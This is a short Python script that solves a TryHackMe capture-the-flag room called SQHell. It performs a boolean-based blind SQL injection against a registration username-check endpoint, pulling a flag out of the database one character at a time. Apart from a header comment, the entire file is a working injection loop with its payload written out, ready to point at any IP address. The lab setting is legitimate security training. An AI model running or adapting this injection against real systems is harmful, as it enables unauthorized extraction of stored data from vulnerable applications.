# Script to retrieve flag 2 for room SQHell - https://tryhackme.com/room/sqhell

import requests
import string

characterlist = string.ascii_uppercase + string.digits + '{' + '}' + ':'

ip = "" #change to machine IP

flag = ""

counter = 1

while True:
    for i in characterlist: # loop through each character in the character list
        r = requests.get("http://" +  ip + f"/register/user-check?username=admin' and (substr((SELECT flag FROM flag LIMIT 0,1),{counter},1)) = '{i}';-- -") #create request
        if 'false' in r.text: # check if return 'false' statement which indicates a match
            flag += i # add the character to the flag string
            counter += 1 # increment the counter by one to then check the next letter
            print(flag) 
            break
